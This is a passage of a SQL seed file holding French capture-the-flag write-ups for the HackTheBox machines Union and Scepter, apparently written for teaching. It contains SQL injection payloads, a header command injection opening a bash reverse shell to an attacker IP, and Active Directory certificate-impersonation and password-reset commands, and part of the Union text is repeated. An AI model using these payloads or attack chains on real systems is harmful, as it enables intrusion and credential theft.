  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: Union
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Union',
  'hackthebox-union',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Linux</div>
</div>



### 1. Reconnaissance & Scanning

Ma phase de reconnaissance commence par un **Port Scanning** exhaustif pour identifier la surface d''attaque. Le scan initial révèle un seul port ouvert, ce qui concentre immédiatement mon attention sur le vecteur Web.

```bash
# Scan complet de tous les ports TCP
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.128

# Scan de services et scripts par défaut sur le port 80
nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.11.128
```

**Résultats clés :**
*   **Port 80/TCP** : **Nginx 1.18.0** (Ubuntu).
*   **PHPSESSID** : Présence d''un cookie de session PHP sans le flag `httponly`.

---

### 2. Énumération Web & Analyse du Vecteur d''Entrée

Le site web concerne les qualifications du tournoi UHC. Un formulaire de saisie de nom d''utilisateur est présent sur `index.php`. En testant différents inputs, je remarque des comportements distincts :
*   Un utilisateur existant (ex: `ippsec`) renvoie un message spécifique.
*   Un utilisateur inexistant renvoie un message d''éligibilité.
*   Certaines chaînes comme `0x` déclenchent une réponse filtrée, suggérant la présence d''un **WAF (Web Application Firewall)** rudimentaire ou d''une liste noire de caractères.

Je lance un **Directory Brute Force** pour découvrir des fichiers cachés :

```bash
feroxbuster -u http://10.10.11.128 -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

**Découvertes :**
*   `config.php` : Retourne une page vide (probablement les accès DB).
*   `challenge.php` : Demande un flag pour continuer.
*   `firewall.php` : Affiche "Access Denied".

---

### 3. Exploitation : Union-based SQL Injection

L''analyse des réponses du formulaire `index.php` révèle une vulnérabilité de type **SQL Injection**. Bien que les caractères classiques comme `''` semblent gérés, l''utilisation de commentaires SQL permet de confirmer l''injection.

> **Schéma Mental :**
> L''application exécute probablement une requête du type : `SELECT username FROM users WHERE username = ''[INPUT]'';`
> Si j''injecte `'' OR 1=1-- -`, je manipule la logique. Le **WAF** bloque " OR ", mais laisse passer d''autres structures. Si l''application affiche directement le résultat de la requête SQL dans la page, une **Union-based SQLi** est possible pour exfiltrer des données arbitraires.

#### Preuve de Concept (PoC)
L''injection est confirmée avec le payload suivant qui simule un utilisateur inexistant mais force l''affichage via `UNION` :

```bash
# Vérification de l''utilisateur actuel de la DB
curl -s -X POST http://10.10.11.128 -d "player='' union select user();-- -" | grep "Sorry"
```

#### Énumération de la Database
J''automatise l''exfiltration via un **one-liner** Bash pour nettoyer la sortie :

```bash
# Lister les bases de données
curl -s -X POST http://10.10.11.128 -d "player='' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata;-- -" | sed ''s/Sorry, //'' | sed ''s/ you are not eligible.*//''

# Lister les tables de la DB ''november''
curl -s -X POST http://10.10.11.128 -d "player='' union select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema=''november'';-- -"

# Extraire le flag de la table ''flag''
curl -s -X POST http://10.10.11.128 -d "player='' union select one from flag;-- -"
```

Le flag récupéré est `UHC{F1rst_5tep_2_Qualify}`. En le soumettant sur `challenge.php`, le serveur m''informe que l''accès SSH est désormais autorisé pour mon IP (le port 22 s''ouvre dynamiquement sur le firewall).

---

### 4. Brèche Initiale : File Read & SSH Access

Grâce aux privilèges de l''utilisateur SQL, je peux utiliser la fonction `LOAD_FILE()` pour lire des fichiers sensibles sur le système de fichiers Linux.

```bash
# Lecture de /etc/passwd pour identifier les utilisateurs système
curl -s -X POST http://10.10.11.128 -d "player='' union select load_file(''/etc/passwd'');-- -"

# Lecture du fichier de configuration pour obtenir les credentials
curl -s -X POST http://10.10.11.128 -d "player='' union select load_file(''/var/www/html/config.php'');-- -"
```

Le fichier `config.php` révèle les identifiants suivants :
*   **User** : `uhc`
*   **Password** : `uhc-11qual-global-pw`

> **Schéma Mental :**
> La vulnérabilité **SQL Injection** a servi de pivot pour :
> 1. Exfiltrer un flag applicatif pour modifier les règles de filtrage réseau (**Port Knocking** via application).
> 2. Réaliser une **Arbitrary File Read** pour obtenir des credentials valides.

Je procède à la connexion via **SSH** pour obtenir mon premier shell stable :

```bash
sshpass -p ''uhc-11qual-global-pw'' ssh uhc@10.10.11.128
```
Une fois connecté, je valide le premier flag utilisateur dans `/home/uhc/user.txt`.

---

### Énumération Post-Exploitation : Analyse du vecteur Web

Une fois mon accès **SSH** établi avec l''utilisateur **uhc**, j''effectue une énumération locale pour comprendre les interactions entre les services. Le point d''entrée initial étant une application PHP, je me concentre sur le répertoire `/var/www/html`.

L''analyse du fichier `challenge.php` révèle que la validation du **flag** (récupéré via l''**SQL Injection** en phase 1) active une variable de session : `$_SESSION[''Authenticated''] = True`. Cette condition est le prérequis pour accéder à `firewall.php`.

Le fichier `firewall.php` contient une vulnérabilité critique de **Command Injection** :

```php
if (isset($_SERVER[''HTTP_X_FORWARDED_FOR''])) {
    $ip = $_SERVER[''HTTP_X_FORWARDED_FOR''];
} else {
    $ip = $_SERVER[''REMOTE_ADDR''];
};
system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
```

La fonction `system()` concatène directement le contenu du header **X-FORWARDED-FOR** sans aucune sanitization. Bien que l''adresse IP réelle (`REMOTE_ADDR`) ne soit pas falsifiable facilement, le header **X-FORWARDED-FOR** est entièrement sous le contrôle de l''attaquant.

> **Schéma Mental : Escalade via Injection de Commande**
> 1. **Condition** : Posséder un cookie de session authentifié (via `challenge.php`).
> 2. **Vecteur** : Injection de métacaractères shell (`;`) dans le header HTTP **X-FORWARDED-FOR**.
> 3. **Exécution** : Le serveur exécute `iptables` suivi de ma commande arbitraire avec les privilèges de **sudo** (car la commande pré-remplie utilise déjà `sudo`).
> 4. **Résultat** : Exécution de code en tant que **www-data**.

---

### Mouvement Latéral : Obtention du shell www-data

Pour exploiter cette injection, j''utilise **Burp Suite** ou **cURL** en injectant une commande après un point-virgule. Je dois m''assurer de terminer la commande par un autre point-virgule pour éviter que les arguments restants de la commande initiale (`-j ACCEPT`) ne provoquent une erreur de syntaxe.

**Payload de test (PoC) :**
```http
X-FORWARDED-FOR: 1.1.1.1; ping -c 1 10.10.14.6;
```

Après avoir confirmé l''exécution via `tcpdump`, je génère un **Reverse Shell** :

```bash
# Commande injectée dans le header X-FORWARDED-FOR
1.1.1.1; bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1";
```

**Stabilisation du Shell :**
Une fois la connexion reçue sur mon **Listener**, je stabilise le terminal pour obtenir un **TTY** interactif :

```bash
python3 -c ''import pty; pty.spawn("/bin/bash")''
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

---

### Escalade de Privilèges : De www-data à root

Maintenant positionné en tant que **www-data**, je vérifie mes privilèges **sudo** disponibles. L''analyse précédente du fichier `firewall.php` suggérait déjà que l''utilisateur web pouvait exécuter certaines commandes avec des privilèges élevés.

```bash
www-data@union:~/html$ sudo -l
```

Le résultat indique une configuration extrêmement permissive dans le fichier **sudoers** :
`User www-data may run the following commands on union: (ALL : ALL) NOPASSWD: ALL`

L''utilisateur **www-data** peut exécuter n''importe quelle commande en tant que **root** sans mot de passe. L''escalade finale est immédiate.

**Exploitation finale :**
```bash
sudo bash
# Identité confirmée : root
id
cat /root/root.txt
```

> **Schéma Mental : Chemin Critique d''Escalade**
> **uhc** (SSH) -> **Analyse Web** (Source Code) -> **Command Injection** (Header HTTP) -> **www-data** (Reverse Shell) -> **Sudo Misconfiguration** (NOPASSWD: ALL) -> **root**.

---

### Élévation de Privilèges & Domination

Une fois l''accès **SSH** établi avec l''utilisateur **uhc**, mon objectif est d''analyser les interactions entre le serveur web et le système d''exploitation. L''énumération locale révèle que le service web tourne sous l''utilisateur **www-data** et possède des privilèges spécifiques liés à la gestion du **firewall**.

#### 1. Mouvement Latéral : De uhc à www-data

En analysant le code source de `firewall.php` (récupéré précédemment via la **SQL Injection** ou directement sur le disque), je relève une vulnérabilité critique de **Command Injection**.

Le script PHP utilise la fonction `system()` pour exécuter une commande **iptables** afin d''autoriser l''adresse IP du visiteur. Le développeur a commis l''erreur de faire confiance au header **X-Forwarded-For**, qui est entièrement contrôlable par l''attaquant.

```php
// Extrait de firewall.php
if (isset($_SERVER[''HTTP_X_FORWARDED_FOR''])) {
    $ip = $_SERVER[''HTTP_X_FORWARDED_FOR''];
} else {
    $ip = $_SERVER[''REMOTE_ADDR''];
};
system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
```

> Schéma Mental :
> **Header HTTP (Untrusted Input)** -> **Variable $ip** -> **Concaténation de chaîne** -> **Fonction system()** -> **Exécution de commande arbitraire**

Pour exploiter cela, je forge une requête HTTP incluant un point-virgule (`;`) pour terminer la commande légitime et injecter mon propre **Reverse Shell**.

```bash
# Payload d''injection via curl
curl -H "X-FORWARDED-FOR: 1.1.1.1; bash -c ''bash -i >& /dev/tcp/10.10.14.6/443 0>&1'';" \
     -b "PHPSESSID=[VALID_SESSION_ID]" \
     http://10.10.11.128/firewall.php
```

Après exécution, je reçois une connexion sur mon **listener** netcat, m''octroyant un shell en tant que **www-data**.

#### 2. Élévation de Privilèges : De www-data à root

L''énumération des droits **sudo** pour l''utilisateur **www-data** montre une configuration extrêmement permissive, probablement mise en place pour faciliter les tests ou par erreur d''administration.

```bash
www-data@union:~/html$ sudo -l
User www-data may run the following commands on union:
    (ALL : ALL) NOPASSWD: ALL
```

La directive `(ALL : ALL) NOPASSWD: ALL` signifie que l''utilisateur peut exécuter n''importe quelle commande avec les privilèges de n''importe quel utilisateur (y compris **root**) sans fournir de mot de passe. L''escalade est immédiate.

```bash
# Passage en root
sudo bash
# Lecture du flag final
cat /root/root.txt
```

---

### Beyond Root : Analyse Post-Exploitation

La compromission totale de la machine **Union** repose sur une chaîne de vulnérabilités classiques mais dévastatrices :

1.  **Trust Boundary Violation** : Le serveur web fait confiance à un header HTTP (**X-Forwarded-For**) pour effectuer des opérations système privilégiées. Dans une architecture sécurisée, seule l''adresse IP réelle de la couche transport (`REMOTE_ADDR`) devrait être utilisée, ou une validation stricte par **Regex** de l''input devrait être appliquée.
2.  **Principe du Moindre Privilège (PoLP)** : L''utilisateur **www-data** ne devrait jamais avoir un accès `sudo ALL`. Si l''application doit modifier le **firewall**, une règle **sudoers** spécifique pour `/usr/sbin/iptables` avec des paramètres restreints aurait dû être configurée.
3.  **SQL Injection as a Gateway** : La **Union-based SQLi** initiale a permis de lire `config.php`, révélant des identifiants réutilisés pour le **SSH**. La **Password Reuse** entre la base de données et le compte système a facilité l''accès initial.
4.  **Firewall Bypass** : Le mécanisme de "port knocking" via PHP pour ouvrir le port 22 est une sécurité par l''obscurité qui a finalement servi de vecteur d''attaque principal.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'SQLi', 'RCE'],
  'Ma phase de reconnaissance commence par un **Port Scanning** exhaustif pour identifier la surface d''attaque. Le scan initial révèle un seul port ouvert, ce qui concentre immédiatement mon attention su...',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: Scepter
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Scepter',
  'hackthebox-scepter',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Hard</div>
  <div class="points">Points: 40</div>
  <div class="os">OS: Windows</div>
</div>

# HTB Write-up : Scepter (Partie 1 - Reconnaissance & Accès Initial)

## 1. Introduction et Posture

**Scepter** est une machine Windows de niveau difficile (Hard) fortement axée sur l''Active Directory et l''exploitation des services de certificats (AD CS). Le chemin de compromission demande de la rigueur : on commence par une fuite de données sur un partage réseau (NFS), qui nous mène à du cracking hors-ligne. Ensuite, c''est un enchaînement d''abus de configurations LDAP et de modèles de certificats (vulnérabilités de type **ESC14**) pour pivoter d''utilisateur en utilisateur, contourner le groupe **Protected Users**, et finalement exécuter un **DCSync**.

L''état d''esprit ici : on est face à une infrastructure d''entreprise typique. Chaque erreur de configuration (permissions LDAP, templates AD CS) doit être identifiée et chaînée.

## 2. Reconnaissance Initiale (Nmap)

Depuis mon environnement **Exegol**, je lance un scan de ports TCP complet pour cartographier la surface d''attaque. On commence toujours par un balayage rapide pour identifier les ports ouverts, suivi d''un scan ciblé avec les scripts par défaut et la détection de version.

Bash

```
# Scan initial de tous les ports
nmap -p- --min-rate 10000 10.10.11.65

# Scan approfondi sur les ports découverts
nmap -p 53,88,111,135,139,389,445,464,593,636,2049,5985,5986,9389 -sCV 10.10.11.65
```

**Analyse des résultats Nmap :**

- **Ports classiques d''un Contrôleur de Domaine (DC) :** DNS (53), Kerberos (88, 464), RPC (135, 593), SMB (139, 445), LDAP (389, 636), ADWS (9389).
    
- **Identifiants clés :** Le domaine est `scepter.htb` et le nom d''hôte est `DC01`.
    
- **Vecteurs d''entrée potentiels :**
    
    - **NFS (2049) avec support RPC (111) :** C''est inhabituel sur un DC Windows et c''est notre première piste majeure. Un partage NFS mal configuré est une mine d''or pour la fuite d''informations.
        
    - **WinRM (5985, 5986) :** C''est le port de gestion à distance Windows. On le garde en tête pour obtenir un **shell** une fois que nous aurons des identifiants valides.
        

_Bonne pratique :_ J''ajoute immédiatement les noms d''hôtes dans mon fichier `/etc/hosts` pour faciliter la résolution DNS par nos outils. On peut automatiser ça avec `netexec` :

Bash

```
netexec smb 10.10.11.65 --generate-hosts-file scepter_hosts
cat scepter_hosts | sudo tee -a /etc/hosts
```

## 3. Énumération du point d''entrée : NFS (Network File System)

Le port 2049 est ouvert. Le service NFS permet de partager des répertoires sur un réseau. J''utilise `showmount` (du paquet `nfs-common`) pour interroger le service RPC et lister les volumes exportés (partagés).

Bash

```
showmount -e dc01.scepter.htb
```

_Output :_ `/helpdesk (everyone)`

Le volume `/helpdesk` est accessible à tous sans authentification. Je le monte sur mon système local pour l''explorer.

Bash

```
sudo mount -t nfs dc01.scepter.htb:/helpdesk /mnt
ls -l /mnt/
```

**Découverte :** Le dossier contient cinq fichiers liés à des infrastructures à clé publique (PKI) :

- `baker.crt` (Le certificat public)
    
- `baker.key` (La clé privée, format PEM)
    
- `clark.pfx`, `lewis.pfx`, `scott.pfx` (Archives PKCS#12 contenant à la fois le certificat et la clé privée)
    

Je copie ces fichiers sur ma machine de pentest pour travailler proprement et je démonte le share.

## 4. Analyse et Cracking Offline des Certificats

En inspectant le fichier `baker.crt`, je lis en clair les métadonnées qui confirment qu''il appartient à `d.baker@scepter.htb`. Cependant, la clé privée `baker.key` est chiffrée (indiqué par `-----BEGIN ENCRYPTED PRIVATE KEY-----`).

Les fichiers `.pfx` sont par nature des conteneurs chiffrés. Si j''essaie de les lire avec `openssl`, on me demande un mot de passe d''importation.

### Le Schéma Mental du Cracking

Nous n''avons aucun identifiant. La seule option logique est une attaque par dictionnaire (brute-force hors-ligne). L''avantage du cracking offline, c''est qu''il ne génère aucun trafic réseau et ne déclenche pas de verrouillage de compte (Account Lockout) côté Active Directory.

Pour cracker ces fichiers, il faut d''abord extraire leurs **hashes** dans un format compréhensible par nos outils de cracking (`John the Ripper` ou `Hashcat`).

**Étape 1 : Extraction des hashes**

J''utilise les utilitaires Python intégrés à John :

Bash

```
# Pour les fichiers PFX
pfx2john.py clark.pfx > pfx.hashes
pfx2john.py lewis.pfx >> pfx.hashes
pfx2john.py scott.pfx >> pfx.hashes

# Pour la clé PEM de d.baker
pem2john.py baker.key | tee baker.hash
```

**Étape 2 : Cracking des fichiers PFX avec John**

Les modules PFX ne sont pas toujours nativement bien gérés par Hashcat, John est plus direct ici. J''utilise la classique wordlist `rockyou.txt`.

Bash

```
john pfx.hashes --wordlist=rockyou.txt
```

_Résultat :_ Tous les fichiers `.pfx` partagent le même mot de passe : `newpassword`.

**Étape 3 : Cracking de la clé PEM avec Hashcat**

Le hash généré par `pem2john` a une syntaxe spécifique (`$PEM$2$pbkdf2$sha256$aes256_cbc...`). Pour le passer à Hashcat, il faut parfois nettoyer le préfixe. En retirant `$pbkdf2$sha256$aes256_cbc`, le format correspond exactement au mode **24420** de Hashcat (PKCS#8 Private Keys).

Bash

```
hashcat -m 24420 baker.hash rockyou.txt
```

_Résultat :_ Le mot de passe de la clé de `baker` est également `newpassword`.

## 5. Authentification Kerberos initiale (TGT)

Maintenant que j''ai les mots de passe des conteneurs cryptographiques, je peux extraire les noms d''utilisateurs exacts (ex: `m.clark`, `e.lewis`, `o.scott`) via `openssl pkcs12`.

L''objectif est d''utiliser ces certificats clients pour demander un **TGT (Ticket Granting Ticket)** au KDC (Key Distribution Center) de l''Active Directory. C''est l''authentification PKINIT (Public Key Cryptography for Initial Authentication in Kerberos).

Je tente de demander un TGT pour `o.scott` avec l''outil `gettgtpkinit.py` (de la suite PKINITtools) ou avec **Certipy** :

Bash

```
gettgtpkinit.py -pfx-pass newpassword -cert-pfx scott.pfx scepter.htb/o.scott o.scott.ccache
```

**Le mur :** Je reçois une erreur `KDC_ERR_CLIENT_REVOKED` (Clients credentials have been revoked).

C''est un comportement très intéressant. Sur le moment, on pourrait penser que le certificat lui-même a été révoqué (via une CRL - Certificate Revocation List). En réalité, dans un environnement AD, cette erreur remonte souvent si le **compte utilisateur lui-même est désactivé** ou si son mot de passe a expiré. Je garde cette information en tête, nous le vérifierons une fois Domain Admin (Beyond Root).

**Le succès avec d.baker :**

Je sais que j''ai la clé de `d.baker` et son certificat public. Je vais les fusionner dans un nouveau fichier `.pfx` propre pour l''utiliser avec Certipy.

Bash

```
# Génération du PFX. On entre "newpassword" pour décrypter baker.key, 
# puis on peut laisser le mot de passe d''exportation vide pour simplifier l''usage avec Certipy.
openssl pkcs12 -export -inkey baker.key -in baker.crt -out baker.pfx

# Synchronisation de l''horloge (Crucial pour Kerberos)
sudo ntpdate scepter.htb

# Demande du TGT et extraction du hash NTLM
certipy auth -pfx baker.pfx -dc-ip 10.10.11.65
```

**Bingo.** Certipy me confirme l''identité (`d.baker@scepter.htb`), récupère un **TGT** (sauvegardé dans `d.baker.ccache`) et me renvoie le **hash NTLM** de l''utilisateur via U2U (User-to-User) Kerberos.

Plaintext

```
[*] Got hash for ''d.baker@scepter.htb'': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
```

Je valide mes accès avec `netexec` en SMB (via le hash NTLM ou via le ticket Kerberos en injectant la variable d''environnement `KRB5CCNAME`).

Bash

```
netexec smb scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce
# OU
KRB5CCNAME=d.baker.ccache netexec smb scepter.htb -k --use-kcache
```

Le statut `[+]` confirme que l''authentification est valide. Cependant, `d.baker` n''a pas les droits pour se connecter en WinRM. Il va falloir énumérer l''AD pour pivoter.

#  Scepter (Partie 2 - AD CS, ESC14 & Protected Users)

## 1. Énumération Active Directory et Premier Pivot (BloodHound)

Avec le hash NTLM de `d.baker` validé, la première étape post-authentification consiste toujours à cartographier les chemins de compromission du domaine. J''utilise `netexec` pour collecter les données **BloodHound** via LDAP.

Bash

```
# Collecte BloodHound via Netexec (LDAP)
netexec ldap scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --bloodhound --dns-server 10.10.11.65
```

**Analyse du graphe :**

Une fois les données importées dans BloodHound, je marque `d.baker` comme _Owned_ et j''observe ses relations sortantes (_Outbound Control_). Le graphe révèle un chemin direct très utile :

`d.baker` possède le privilège **ForceChangePassword** sur l''utilisateur `a.carter`.

_Schéma mental :_ Le droit `ForceChangePassword` (souvent lié à l''ACL `User-Force-Change-Password`) permet à un utilisateur de réinitialiser le mot de passe d''une cible sans connaître l''ancien. C''est un vecteur d''élévation de privilèges horizontal ou vertical basique mais redoutable.

J''exploite ce droit immédiatement avec `netexec` pour prendre le contrôle de `a.carter` :

Bash

```
# Réinitialisation du mot de passe de a.carter
netexec smb scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce -M change-password -o USER=a.carter NEWPASS=Welcome1!

# Validation des nouveaux accès
netexec smb scepter.htb -u a.carter -p Welcome1!
```

L''accès est validé, mais tout comme `d.baker`, `a.carter` n''a pas les droits pour ouvrir une session WinRM distante. Il faut creuser plus loin.

## 2. Découverte de la Vulnérabilité (AD CS & LDAP)

En reprenant l''analyse BloodHound et les groupes LDAP, je constate que `a.carter` est membre du groupe **IT Support**. Ce groupe possède un droit critique : **GenericAll** (contrôle total) sur l''Unité Organisationnelle (OU) _Staff Access_. Or, l''utilisateur `d.baker` se trouve justement dans cette OU.

Concrètement, `a.carter` peut modifier n''importe quel attribut LDAP de `d.baker`.

### Énumération des Certificats (Certipy)

Puisque le domaine utilise Active Directory Certificate Services (AD CS), je lance une recherche de modèles (templates) vulnérables :

Bash

```
certipy find -vulnerable -u d.baker -hashes :18b5fb0d99e7a475316213c15b6f22ce -dc-ip 10.10.11.65 -stdout
```

L''outil remonte le template **StaffAccessCertificate**. Analysons ses propriétés clés :

- **Enrollee :** Le groupe _Staff_ a le droit de demander ce certificat (Enrollment Rights). `d.baker` est membre de ce groupe.
    
- **Certificate Name Flag :** `SubjectAltRequireEmail`. C''est l''élément déclencheur. Cela signifie que le certificat généré inclura l''adresse e-mail de l''utilisateur demandeur dans le champ _Subject Alternative Name_ (SAN).
    

### Analyse de la cible : h.brown

En fouillant les autres utilisateurs via des requêtes LDAP ciblées, un attribut très spécifique saute aux yeux sur le compte de l''utilisateur `h.brown` :

Bash

```
# Requête LDAP détaillée sur h.brown
netexec ldap scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --query "(sAMAccountName=h.brown)" ""
```

_Output intéressant :_ `altSecurityIdentities: X509:<RFC822>h.brown@scepter.htb`

**Le concept technique :** L''attribut **altSecurityIdentities** est utilisé par Windows pour lier un certificat explicite à un compte utilisateur. Ici, le préfixe `<RFC822>` indique que le système acceptera une authentification Kerberos si le certificat présenté contient l''adresse e-mail `h.brown@scepter.htb` dans son SAN.

## 3. Le Schéma d''Attaque Logique (Type ESC14)

Nous avons toutes les pièces du puzzle. Voici le déroulé logique de l''attaque :

1. Je contrôle `a.carter` qui a les droits **GenericAll** sur l''objet `d.baker`.
    
2. J''utilise `a.carter` pour modifier l''attribut LDAP `mail` de `d.baker`, et je le remplace par la valeur attendue par la cible : `h.brown@scepter.htb`.
    
3. Je demande un certificat via le template _StaffAccessCertificate_ en utilisant le compte de `d.baker`.
    
4. L''Autorité de Certification (CA) lit l''attribut `mail` modifié de `d.baker` et l''inscrit dans le SAN du certificat.
    
5. Je présente ce certificat falsifié au contrôleur de domaine. Le DC lit l''e-mail dans le certificat, le compare avec l''attribut **altSecurityIdentities** de `h.brown`, trouve une correspondance, et m''accorde un ticket Kerberos (TGT) au nom de `h.brown`.
    

## 4. Exécution de l''Usurpation d''Identité

Pour manipuler les attributs LDAP depuis mon environnement Linux, j''utilise l''excellent outil **bloodyAD**.

**Étape 1 : Falsification de l''attribut mail**

Bash

```
# a.carter modifie l''attribut ''mail'' de d.baker
bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p Welcome1! set object d.baker mail -v h.brown@scepter.htb
```

**Étape 2 : Demande du certificat piégé**

Bash

```
# d.baker demande le certificat (qui inclura le faux mail)
certipy req -username d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.10.11.65
```

Cela génère le fichier `d.baker.pfx`. Si tu l''inspectes avec `openssl x509 -text`, tu verras bien `Subject: CN = d.baker, emailAddress = h.brown@scepter.htb`. Le piège est tendu.

**Étape 3 : Authentification en tant que cible**

Bash

```
# On utilise le certificat pour usurper h.brown
certipy auth -pfx d.baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username h.brown
```

Succès. Certipy me sauvegarde un TGT (`h.brown.ccache`) et réussit à extraire son hash NTLM : `4ecf5242092c6fb8c360a08069c75a0c`.

## 5. Contournement du groupe Protected Users

J''ai le hash NTLM de `h.brown`, je tente de me connecter pour obtenir mon premier vrai shell :

Bash

```
evil-winrm -i dc01.scepter.htb -u h.brown -H 4ecf5242092c6fb8c360a08069c75a0c
# Erreur : WinRMAuthorizationError
```

Accès refusé. Pourquoi ? En regardant les groupes de `h.brown`, on remarque qu''il appartient au groupe natif **Protected Users**.

_Explication pragmatique :_ Le groupe `Protected Users` est une excellente mesure de sécurité de Microsoft. Les membres de ce groupe subissent des restrictions sévères pour limiter les vols d''identifiants (credentials theft). L''une des règles fondamentales est que **l''authentification NTLM est strictement interdite**. Seul Kerberos est autorisé.

Ce n''est pas un problème, puisque Certipy m''a généré un fichier `.ccache` (le fameux TGT). Je vais réaliser un **Pass-the-Ticket (PtT)**.

Bash

```
# Utilisation du ticket Kerberos avec Evil-WinRM
KRB5CCNAME=h.brown.ccache evil-winrm -i dc01.scepter.htb -r scepter.htb
```

La connexion s''établit. Je suis connecté sur `DC01` en tant que `h.brown` et je peux lire le premier flag `user.txt`.


#  Scepter (Partie 3 - ACLs, DCSync & Beyond Root)

## 1. Énumération Locale et Groupes (h.brown)

Nous avons obtenu un accès WinRM sur `DC01` en tant que `h.brown`. La première étape d''une post-exploitation propre consiste à faire un état des lieux de notre environnement d''exécution.

Je fouille rapidement le système de fichiers (`C:\Users`, `C:\HelpDesk`), mais rien de critique n''y est stocké en dehors de notre `user.txt`. La vraie valeur ajoutée se trouve dans le **LDAP**.

J''analyse les groupes de `h.brown` :

- `Domain Users` (Standard)
    
- `Remote Management Users` (Ce qui nous a permis d''utiliser WinRM)
    
- `Protected Users` (Ce qui nous a obligés à utiliser un TGT Kerberos au lieu du NTLM)
    
- **`Helpdesk Admins`**
    
- **`CMS`**
    

Les groupes `Helpdesk Admins` et `CMS` ne sont pas standards. Ce sont des groupes métiers créés spécifiquement sur ce domaine. C''est systématiquement là qu''il faut creuser pour trouver des erreurs d''**ACLs (Access Control Lists)**.

## 2. Définition de la Cible (BloodHound)

Sans visibilité, je retourne sur mes données BloodHound collectées précédemment. J''utilise la requête pré-intégrée _Shortest Paths to Domain Admin_. Le graphe est épuré, mais un utilisateur précis se démarque : `p.adams`.

Pourquoi cibler `p.adams` ?

Il est membre du groupe natif **Replication Operators**.

_Schéma mental :_ Le groupe `Replication Operators` (ou les droits équivalents `DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All`) permet à un compte de simuler le comportement d''un contrôleur de domaine légitime pour demander la réplication des données de l''AD. C''est la porte grande ouverte pour l''attaque **DCSync**. Si je compromets `p.adams`, je compromets tout le domaine.

## 3. Analyse des Privilèges (dsacls & bloodyAD)

Comment passer de `h.brown` à `p.adams` ? Je dois déterminer si mon utilisateur (ou l''un de ses groupes, comme `CMS`) possède des droits d''écriture sur cette cible.

J''utilise `bloodyAD` avec mon TGT valide pour demander l''ensemble des objets sur lesquels `h.brown` possède des droits d''écriture :

Bash

```
# Énumération des droits d''écriture effectifs
KRB5CCNAME=h.brown.ccache bloodyAD --host dc01.scepter.htb -d scepter.htb -k get writable --detail
```

_Output partiel :_

Plaintext

```
distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
altSecurityIdentities: WRITE
```

La confirmation peut aussi se faire via l''outil natif Windows `dsacls` directement depuis notre session WinRM :

PowerShell

```
dsacls "CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb"
```

On y lit clairement que le groupe `CMS` (dont nous faisons partie) possède l''autorisation spéciale (`WRITE PROPERTY`) sur l''attribut **altSecurityIdentities** de `p.adams`.

## 4. Répétition de la mécanique ESC14

Nous sommes exactement dans la même configuration logique qu''en Partie 2, mais un cran plus haut dans la chaîne de privilèges.

La cible `p.adams` ne possède actuellement aucun attribut `altSecurityIdentities`. Nous allons lui en créer un sur mesure, puis réutiliser notre accès à `a.carter` (qui contrôle toujours `d.baker`) pour générer un certificat valide.

**Étape 1 : Injection de l''identité alternative sur la cible**

J''injecte une adresse e-mail arbitraire (ex: `tristan@scepter.htb`) dans l''objet de `p.adams` en utilisant les droits de `h.brown`.

Bash

```
KRB5CCNAME=h.brown.ccache bloodyAD --host DC01.scepter.htb -d scepter.htb -k set object p.adams altSecurityIdentities -v ''X509:<RFC822>tristan@scepter.htb''
```

**Étape 2 : Falsification du compte enrolleur (d.baker)**

Je reprends mon accès `a.carter` (cf. Partie 2) pour modifier l''e-mail de `d.baker` et le faire correspondre à celui que je viens d''injecter.

Bash

```
bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p Welcome1! set object d.baker mail -v tristan@scepter.htb
```

**Étape 3 : Demande du certificat piégé et Usurpation**

Je demande le certificat avec `d.baker`. L''AD CS va lire l''attribut `mail` de `d.baker` (`tristan@scepter.htb`) et le placer dans le **SAN** du certificat.

Bash

```
# Génération du PFX falsifié
certipy req -username d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.10.11.65

# Authentification en tant que p.adams
certipy auth -pfx d.baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username p.adams
```

